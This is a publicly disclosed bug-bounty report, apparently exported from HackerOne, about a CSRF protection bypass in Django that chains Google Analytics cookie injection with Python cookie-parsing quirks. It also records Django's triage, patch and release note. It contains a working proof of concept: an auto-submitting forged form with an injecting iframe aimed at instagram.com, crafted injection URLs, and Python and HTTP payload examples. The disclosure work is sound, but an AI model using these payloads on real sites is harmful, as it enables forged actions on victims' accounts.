{"id":26647,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjY0Nw==","url":"https://hackerone.com/reports/26647","title":"CSRF protection bypass on any Django powered site via Google Analytics","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-09-01T08:28:27.353Z","submitted_at":"2014-09-01T08:28:27.353Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bobrov","url":"/bobrov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23,"url":"https://hackerone.com/django","handle":"django","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Django","twitter_handle":null,"website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-09-26T19:29:10.967Z","bug_reporter_agreed_on_going_public_at":"2016-09-26T19:29:10.830Z","team_member_agreed_on_going_public_at":"2016-09-26T19:11:44.454Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I shall explain all the steps to create the final PoC in order to be more clear.\r\n\r\nPart 1. Cookie Injection via Google Analytics \r\n---------------------\r\n(Reported to Google, rewarded, still working)\r\n\r\n*   Google Analytics sets the cookie to track user source:\r\n   `__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]`\r\n   For example:\r\n   `__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/`\r\n\r\n*   User fully controls path in Referer and it is not filtered before being put in __utmz\r\n\r\nPart 2. Cookie parsing peculiarities by different web servers\r\n---------------------\r\n*   A typical Cookie sent by a web browser looks like this: \r\n   Cookie: param1=value1; param2=value2;\r\n\r\n*   Many web servers accept cookies delimited not only by semicolons but also by commas: \r\n   Cookie: param1=value2, param2=value2\r\n   Cookie: param1=value2,param2=value2\r\n\r\n*   Python + Django handle cookies with incorrect regular expression that allows to use characters [ \\ ] as delimiters: \r\n   Cookie: param1=value1]param2=value2\r\n\r\nhttps://docs.python.org/3/library/http.cookies.html\r\nhttp://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432\r\nhttp://tools.ietf.org/html/rfc2109\r\nhttp://tools.ietf.org/html/rfc2068\r\n\r\nExample:\r\n```\r\n\u003e\u003e\u003e from http import cookies\r\n\u003e\u003e\u003e C = cookies.SimpleCookie()\r\n\u003e\u003e\u003e C.load('__utmz=blah]csrftoken=x')\r\n\u003e\u003e\u003e C\r\n\u003cSimpleCookie: csrftoken='x'\u003e\r\n```\r\n\r\nPart 3. Cookie handling peculiarities in different web browsers \r\n---------------------\r\n(Reported to Google, won't fix)\r\n*   For all the web browsers except Safari characters of space, comma, and [ \\ ] can be used as cookie values\r\n\r\n*   Chrome handles only a limited number of cookie-attributes, e.g.: \r\n   Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;\r\n   will set cookie for .google.com but not for blah.blah.blah.google.com\r\n\r\nCombining all these facts\r\n---------------------\r\n\r\nProvided that:\r\n* A site uses Google Analytics\r\n* This site is hosted by a web server that has some of the aforementioned cookie parsing peculiarities (e.g. Django)\r\n* This site implements Cookie based CSRF protection (a value in Cookie and some request parameter must be equal)\r\n\r\nThen:\r\n* We can set new arbitrary cookies or redefine the values of existing ones\r\n* This site is vulnerable to CSRF protection bypass\r\n\r\n\r\nThe principal problem of __utmz cookie is that it is set for six months and is not refreshed. This problem can be solved in Google Chrome if you find a subdomain with Google Analytics and rewrite attribute \"domain\" using the peculiarity that has been described in part 3 with the value \".site.com\".\r\n\r\nIn other browsers the vulnerability can be exploited by cookie injection at the moment of __utmz refreshing.\r\n\r\nPoC\r\n---------------------\r\n\r\nVulnerability exploitation on instagram.com with Google Chrome\r\n(Reported to Facebook, redirected to Django Team)\r\n\r\n* Open Google Chrome in incognito mode\r\n* Authenticate on instagram.com\r\n* Click the link and wait some seconds\r\n* Result - follow http://instagram.com/black2fan\r\n\r\nhttp://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html\r\nSource:\r\n```\r\n\u003cform \r\naction=\"http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed\" \r\nid=\"csrf\" \r\nmethod=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"x\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\r\n\u003c/form\u003e\r\n\r\n\u003cscript\u003e\r\n      function xxx() {\r\n        document.getElementById('csrf').submit();\r\n      }\r\n\u003c/script\u003e\r\n\r\n\u003ciframe \r\nonload=\"xxx()\" \r\nsrc=\"http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\"/\u003e\r\n```\r\n\r\nDescription:\r\n*   A user authenticates on instagram.com\r\n\r\n*   We make him visit the link below assuming that he has not visited blog.instagram.com and he doesn't have __utmz set on this subdomain:\r\n   http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\r\n   Cookie is rewritten with new path and domain, as a result cookie is set for .instagram.com:\r\n   __utmz=90378079.1401435337.1.1.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/r/,]csrftoken=x,\r\n\r\n*   At this moment request to the web server will make it believe that cookie __utmz consists of incorrect cookie and CSRF token equals to \"x\"\r\n\r\n*   Submit follow form using CSRF-token \"x\"\r\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-10-26T19:11:44.538Z","allow_singular_disclosure_after":-156453738.52724394,"singular_disclosure_allowed":true,"vote_count":64,"voters":["dirk","stefanofinding","fransrosen","d1m0ck","cdl","hogarth45","bobrov","harisec","hunter","michiel","and 54 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":119774,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Sergey,\n\nthat seems like a really nice finding! I am currently on a conference with flaky WLAN, but I've forwarded it internally. We might need a bit of time for this, cause we need to communicate this to the Python team too and see what they think.","automated_response":false,"created_at":"2014-09-01T11:30:31.371Z","updated_at":"2014-09-01T11:30:31.371Z","actor":{"username":"apollo13","cleared":false,"url":"/apollo13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":120260,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Sergey,\n\nFirst off, thank you very much for a well researched, and clearly reported bug. I believe you're the first person to report a valid one through this program. I've looked this over, and I agree that there's a real bug here. As you mentioned, this is a bug in the core Python library, and this example of a practical exploit using Django is very helpful.\n\nI see that you haven't submitted this yet to the security@python.org alias - since it's fundamentally a Python bug, that's where we'll need to start with the fix. I'm on the response team there too, and would appreciate it if you could submit this bug report there (sorry to ask you to forward the report again). Python does have a bounty, and I'll make sure you're properly rewarded for this.\n\nDjango will probably make a security release with a workaround for the Python bug, but we'll need to coordinate with upstream Python to do that, and I expect the reward will come from the Python project.\n\nThank you for your hard work!\n-Paul","automated_response":false,"created_at":"2014-09-02T20:58:27.243Z","updated_at":"2014-09-02T20:58:27.243Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":128567,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Sergey,\n\nUpstream python applied this patch:\nhttps://hg.python.org/cpython/rev/270f61ec1157\n\nCan you confirm that this fixes the issue? From my reading of your bug report, I'm not sure it does.\n\nThe Django Project would like to continue to keep this issue private until we can also issue a security release with a workaround.\n\n-Paul","automated_response":false,"created_at":"2014-09-17T17:12:27.615Z","updated_at":"2014-09-17T17:12:27.615Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":129067,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, this patch fixes a bug related to the characters  [ \\ ]. \n\nHowever, there are still other similar options, such as the use of white space characters without double quotes. \n\n    C = cookies.SimpleCookie()\n    C.load('__utmz=blah csrftoken=x')\n    C.load('__utmz=blah\\x09csrftoken=x')\n    C.load('__utmz=blah\\x0bcsrftoken=x')\n    C.load('__utmz=blah\\x0ccsrftoken=x') \n\nWith a real exploitation of course there are problems here, because: \n*   Internet Explorer replaces characters \\x09 \\x0b \\x0c on \"_\".\n\n*   Chrome does not set the cookie, if they contain characters \\x09 \\x0b \\x0c. \n\n*   Google Analytics replaces the space with %20 \n(but, nevertheless, the problem may arise in the other JS-scripts or in setting Cookie from Web server).\n\n\nBut Firefox supports all of these characters and that's a real example of another bypass CSRF protection: \n\n1.  Remove all cookie from http://instagram.com \n\n2.  Open the link using FireFox \nhttp://instagram.com/?utm_source=1\u0026utm_medium=2\u0026utm_campaign=3\u0026utm_term=4\u0026utm_content=5%09csrftoken=x#\n\n3.  Reload the page and make sure that csrftoken=x\n","automated_response":false,"created_at":"2014-09-18T10:56:10.824Z","updated_at":"2014-09-18T10:56:10.824Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":148153,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, \nany new info about this vuln?","automated_response":false,"created_at":"2014-10-25T06:29:33.412Z","updated_at":"2014-10-25T06:29:33.412Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":148783,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nwe are working on a patch and will include it during the next security release.  We will show you the diff once we are sufficiently happy with the patch.\n\nCheers,\nFlorian","automated_response":false,"created_at":"2014-10-27T13:44:31.076Z","updated_at":"2014-10-27T13:44:31.076Z","actor":{"username":"apollo13","cleared":false,"url":"/apollo13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":400916,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for your excellent, well researched report, and your patience waiting for the payment.","automated_response":false,"created_at":"2015-05-04T06:46:04.859Z","updated_at":"2015-05-04T06:46:04.859Z","actor":{"url":"/django","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Django"}},"bounty_amount":"1000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"django","collaborator":{"username":"bobrov","url":"/bobrov"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":400920,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2015-05-04T06:50:24.803Z","updated_at":"2015-05-04T06:50:24.803Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":400945,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-05-04T07:43:51.243Z","updated_at":"2015-05-04T07:43:51.243Z","first_to_agree":true,"actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":404138,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, what about disclosure?\nAnd it can still be exploited for FireFox\nhttps://instagram.com/?utm_source=1\u0026utm_medium=2\u0026utm_campaign=3\u0026utm_term=4\u0026utm_content=5%09csrftoken%3dx","automated_response":false,"created_at":"2015-05-07T11:06:30.129Z","updated_at":"2015-05-07T11:06:30.129Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":404189,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If Firefox is still (or differently) vulnerable then we probably shouldn't it publicly just yet (regardless of the fact that you already did so in the twitter variant of the same bug). Is there an open upstream ticket about Firefox?","automated_response":false,"created_at":"2015-05-07T12:36:44.766Z","updated_at":"2015-05-07T12:36:44.766Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":404190,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","automated_response":false,"created_at":"2015-05-07T12:37:13.399Z","updated_at":"2015-05-07T12:37:13.399Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":404261,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I haven't reported this to FireFox, because I think, that this is Python/Django blank symbols processing issue.\n\n```python\n\u003e\u003e\u003e import Cookie\n\u003e\u003e\u003e C = Cookie.SimpleCookie()\n\u003e\u003e\u003e C.load('__utmz=blah csrftoken=x')\n\u003e\u003e\u003e C.load('__utmz=blah\\x09csrftoken=x')\n\u003e\u003e\u003e C.load('__utmz=blah\\x0bcsrftoken=x')\n\u003e\u003e\u003e C.load('__utmz=blah\\x0ccsrftoken=x')\n\u003e\u003e\u003e C\n\u003cSimpleCookie: __utmz='blah' csrftoken='x'\u003e\n```","automated_response":false,"created_at":"2015-05-07T14:17:44.102Z","updated_at":"2015-05-07T14:17:44.102Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":404380,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah, it's a python issue. Is there an open bug for it? I know here were some followup problems associated with the python patch, but I'm not sure where that ended up.","automated_response":false,"created_at":"2015-05-07T17:03:16.368Z","updated_at":"2015-05-07T17:03:16.368Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":781561,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Sergey, I can't reproduce the problem with the Instagram link you provided and Firefox 44. Are you able to?","automated_response":false,"created_at":"2016-02-02T18:14:52.940Z","updated_at":"2016-02-02T18:14:52.940Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":781606,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"By the way, what do you think the correct behavior is for parsing the whitespace case? Following the \"lax parsing\" fix in Python, we've had a number of reports where invalid cookies set by third-parties causes all subsequent cookies not to be parsed which causes the Django session to be lost (or even prevents users from being able to login).\n\nhttps://bugs.python.org/issue25228\nhttps://code.djangoproject.com/ticket/26158","automated_response":false,"created_at":"2016-02-02T18:40:01.145Z","updated_at":"2016-02-02T18:40:01.145Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1189197,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If Django's cookie parsing is still problematic here, I think it should be fixed in Django 1.10 by https://github.com/django/django/commit/93a135d111c2569d88d65a3f4ad9e6d9ad291452. We could consider backporting that patch to Django 1.9 and 1.8 if necessary. I'm not sure about the steps to reproduce -- I forget what I did earlier. Is an Instagram account required?","automated_response":false,"created_at":"2016-09-12T18:13:05.821Z","updated_at":"2016-09-12T18:13:05.821Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1189416,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, this patch looks correct. \nIt looks like instagram stopped using Google Analytics and currently is not vulnerable.","automated_response":false,"created_at":"2016-09-12T19:35:02.937Z","updated_at":"2016-09-12T19:35:02.937Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1189479,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is it worth setting up a test site to confirm the issue still exists in older versions of Django (to confirm browsers  haven't changed behavior, I guess) and to confirm that Django 1.10 fixes it?","automated_response":false,"created_at":"2016-09-12T20:00:33.278Z","updated_at":"2016-09-12T20:00:33.278Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1189534,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I checked locally django 1.9 and django 1.10.\nDjango 1.9 (vulnerable)\n```\nCookie: test=test;csrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=\";csrftoken=xxx;\nSet-Cookie:  csrftoken=0wimKaIH8G80FQIS4RTytZHTd4YG7NCF;\n\nCookie: test=test csrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=test\\x0bcsrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=test\\x0ccsrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n```\n\nDjango 1.10 (not vulnerable)\n```\nCookie: test=test;csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\n\nCookie: test=\";csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\n\nCookie: test=test csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=DFuxUi1LLWPvRo4UGDpKN04fi7fLlKPazescjWpGUTiZ7UfNbKVN5rsq0F3viliq;\n\nCookie: test=test\\x0Bcsrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=vNcLbQhSzhMBvoj4qB74ttCwq9JVwUvblWUSBynOFraVq0A7s899NYZXuCyIcRe8;\n\nCookie: test=test\\x0Ccsrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=X3WYa2flCaPfLmW64okiFlkcmnzzizbcaru78nLwyZnhASpwsu6x6j0ia5dwfzit;\n```","automated_response":false,"created_at":"2016-09-12T20:32:44.026Z","updated_at":"2016-09-12T20:32:44.026Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1189975,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, I'll start the security release process. How does this look for a release note:\n\nCSRF protection bypass on a site with Google Analytics\n======================================================\n\nAn interaction between Google Analytics and Django's cookie parsing could allow\nan attacker to set arbitrary cookies leading to a bypass of CSRF protection.\n\nThe parser for ``request.COOKIES`` is simplified to better match the behavior\nof browsers and to mitigate this attack. ``request.COOKIES`` may now contain\ncookies that are invalid according to :rfc:`6265` but are possible to set via\n``document.cookie``.","automated_response":false,"created_at":"2016-09-12T23:22:09.702Z","updated_at":"2016-09-12T23:22:09.702Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1189979,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-09-12T23:23:01.413Z","updated_at":"2016-09-12T23:23:01.413Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1216924,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Released today: https://www.djangoproject.com/weblog/2016/sep/26/security-releases/","automated_response":false,"created_at":"2016-09-26T19:11:09.315Z","updated_at":"2016-09-26T19:11:09.315Z","actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1216925,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-09-26T19:11:44.497Z","updated_at":"2016-09-26T19:11:44.497Z","first_to_agree":true,"actor":{"username":"timgraham","cleared":false,"url":"/timgraham","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1216975,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-09-26T19:29:10.907Z","updated_at":"2016-09-26T19:29:10.907Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1216977,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-09-26T19:29:11.012Z","updated_at":"2016-09-26T19:29:11.012Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}